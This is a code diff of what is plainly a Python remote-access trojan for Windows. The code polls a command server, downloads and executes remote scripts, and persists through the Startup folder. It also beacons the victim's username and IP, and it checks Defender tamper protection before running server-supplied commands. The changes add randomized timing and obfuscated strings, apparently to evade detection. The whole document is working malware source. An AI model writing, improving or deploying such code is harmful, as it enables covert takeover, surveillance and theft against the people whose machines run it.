@@ -8,22 +8,26 @@ import requests
 import sys
 import ctypes
 import base64
+import random
 
 # Packages for custom scripts
+# Do not import these packages in your script and only import them in the executor.py
 
 import pyautogui
-import sqlite3
-import cryptography
+import wmi
+import win32api
+import http
+import winreg
+import pyaudio
+import wave
 import keyboard
 import cv2
 import PIL
 import psutil
-import wmi
-
 
 server_url = base64.b64decode("DO_NOT_CHANGE_ME").decode()
 scripts_url = f"{server_url}/scripts.txt"
-check_interval = 5
+check_interval = random.randint(5, 10)
 APPDATA = os.getenv("APPDATA")
 TEMP = os.getenv("TEMP")
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -50,14 +54,15 @@ def get_target_url():
             return response.read().decode("utf-8").strip().splitlines()
     except:
         return None
-def download_and_execute_script(script_name):
-    script_url = f"{server_url}/scripts/{script_name}"
-    try:
-        urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
-        execute_script(os.path.join(TEMP, script_name))
-    except:
-        var = None
-def execute_script(script_name):
+def dload_run(script_name):
+    if not script_name == "OK":
+        script_url = f"{server_url}/scripts/{script_name}"
+        try:
+            urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
+            run(os.path.join(TEMP, script_name))
+        except:
+            var = None
+def run(script_name):
     def run_script():
         try:
             exec(open(script_name).read())
@@ -74,32 +79,38 @@ def save_copy():
     try:
         if sys.argv[0] != SCRIPT_PATH:
             shutil.copy(sys.argv[0], SCRIPT_PATH)
-            if is_admin():
-                hider = requests.get(f"{server_url}/hide.txt").text
-                subprocess.Popen(f'{hider} "{SCRIPT_PATH}"')
+            hider = requests.get(f"{server_url}/hide.txt").text
+            subprocess.run(f'{hider} "{SCRIPT_PATH}"')
     except:
         pass
-def send_alert():
+def alert():
+    headers = {'Content-Type': 'application/json'}
     data = {
     "INFO": f"{os.getlogin()} with IP: {requests.get(base64.b64decode('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc=').decode()).text} has run the executable!"
     }   
-    requests.post(f"{server_url}/reply", data=data)
-
-
+    requests.post(f"{server_url}/reply", json=data, headers=headers)
 request_admin()
 if is_admin():
-    subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
+    try:
+        result = subprocess.run(
+            base64.b64decode("cG93ZXJzaGVsbCAtQ29tbWFuZCBHZXQtTXBDb21wdXRlclN0YXR1cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElzVGFtcGVyUHJvdGVjdGVk").decode(),
+            capture_output=True, text=True, check=True
+        )
+        if not "true" in result.stdout.strip().lower():
+            subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
+    except:
+        pass
+
 save_copy()
-send_alert()
+alert()
 
 while True:
     try:
         script_names = get_target_url()
         if script_names:
             for script_name in script_names:
-                download_and_execute_script(script_name)
+                dload_run(script_name)
             send_completion_request()
-
         time.sleep(check_interval)
     except:
         pass
